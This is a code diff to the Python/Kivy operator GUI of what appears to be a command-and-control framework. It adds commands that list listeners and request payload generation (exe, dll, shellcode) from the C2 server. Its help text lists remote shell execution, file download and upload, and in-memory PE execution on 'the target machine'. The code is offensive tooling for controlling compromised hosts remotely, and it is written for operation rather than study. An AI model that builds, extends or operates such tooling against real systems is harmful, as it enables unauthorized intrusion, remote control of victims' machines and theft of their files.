@@ -22,6 +22,7 @@ import subprocess
 import sys
 import json
 import os
+import requests
 
 MAX_CONSOLE_LINES = 100000
 
@@ -196,17 +197,9 @@ class MainFrame(Screen):
             background_color=(0, 0, 0, 1),
             foreground_color=(1, 1, 1, 1),
             size_hint=(1, None),
-            height=400
+            height=300
         )
-        scrollview = ScrollView(
-            size_hint=(1, 1),
-            bar_width=10,
-            bar_color=RED,
-            bar_inactive_color=GRAY,
-            scroll_type=['bars', 'content']
-        )
-        scrollview.add_widget(self.console_textinput)
-        console_box.add_widget(scrollview)
+        console_box.add_widget(self.console_textinput)
         prompt_box = BoxLayout(orientation='horizontal', size_hint_y=0.12, spacing=6)
         self.cmd_txt = TextInput(hint_text="Command input", size_hint_x=0.86, background_color=INPUT_GRAY, foreground_color=WHITE, multiline=False)
         send_btn = Button(text="Send", size_hint_x=0.14, background_color=[.15,.44,.22,1])
@@ -241,7 +234,7 @@ class MainFrame(Screen):
             self.console_history = []
         lines = txt.splitlines()
         self.console_history.extend(lines)
-        to_display = self.console_history[-1000:]  
+        to_display = self.console_history 
         self.console_textinput.text = "\n".join(to_display)
         self.console_textinput.cursor = (0, len(self.console_textinput.text))
 
@@ -359,19 +352,64 @@ class MainFrame(Screen):
             Clock.schedule_once(lambda dt: self.append_to_console(f"[!] Exception: {e}\n"))
 
     def on_shell_command(self, _):
+        display_help = """
+Available Commands:
+--------------------
+- listeners
+    Return the active listeners list
+
+- generate <listener_name> <payload_type>
+    Generate a payload for the choosen listener
+    Available payload types : "exe", "dll", "shellcode"
+    Example: generate http dll
+
+- shell <cmd>
+    Execute the specified shell command on the target machine.
+    Example: shell whoami
+
+- download <remote_file_path>
+    Download a file from the target machine to the server.
+    Example: download C:\\Users\\user\\Desktop\\file.txt
+
+- upload <local_file_path>
+    Upload a file from the server to the target machine.
+    Example: upload /home/user/payload.exe
+
+- exec-pe <local_file_path>
+    In-memory execution of a local PE on the target machine.
+    Example: exec-pe /home/user/payload.exe
+"""
         idx = self.rv_agents.selected_idx
-        if idx is None or not self._agents:
-            Clock.schedule_once(lambda dt: self.append_to_console("\n[!] Please select an agent."))
-            self.cmd_txt.text = ""
-            return
         cmd = self.cmd_txt.text.strip()
         if not cmd:
             Clock.schedule_once(lambda dt: self.append_to_console("\n"))
             self.cmd_txt.text = ""
             return
+        if cmd.lower().startswith("listeners"):
+            resp = requests.get(f"{self.base_url}/listeners", auth=self.auth)
+            if resp.ok:
+                results = resp.json().get("listeners", [])
+                listeners = "Listeners:\n"
+                for lines in results:
+                    listeners += lines
+                Clock.schedule_once(lambda dt: self.append_to_console(listeners))
+            return
+        elif cmd.lower().startswith("generate"):
+            resp = requests.get(f"{self.base_url}/generate/http/exe", auth=self.auth)
+            print(resp)
+            if resp.ok:
+                results = resp.json().get("results", [])
+                Clock.schedule_once(lambda dt: self.append_to_console(results))
+            return
+        # agent commands
+        if idx is None or not self._agents:
+            Clock.schedule_once(lambda dt: self.append_to_console(f"\n{display_help}\n"))
+            self.cmd_txt.text = ""
+            return
         agent = self._agents[idx]
         agent_id = agent['agent_id']
-        try: from utils.requests_utils import queue_shell_command
+        try: 
+            from utils.requests_utils import queue_shell_command
         except Exception:
             def queue_shell_command(*a,**k): pass
         if cmd.lower().startswith("shell "):
@@ -425,24 +463,5 @@ class MainFrame(Screen):
             resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
             threading.Thread(target=self.get_upload_result, args=(agent_id,)).start()
         else:
-            display_help = """
-Available Commands:
---------------------
-- shell <cmd>
-    Execute the specified shell command on the target machine.
-    Example: shell whoami
-
-- download <remote_file_path>
-    Download a file from the target machine to the server.
-    Example: download C:\\Users\\user\\Desktop\\file.txt
-
-- upload <local_file_path>
-    Upload a file from the server to the target machine.
-    Example: upload /home/user/payload.exe
-
-- exec-pe <local_file_path>
-    In-memory execution of a local PE on the target machine.
-    Example: exec-pe /home/user/payload.exe
-"""
             Clock.schedule_once(lambda dt: self.append_to_console(f"\n{display_help}\n"))
         self.cmd_txt.text = ""
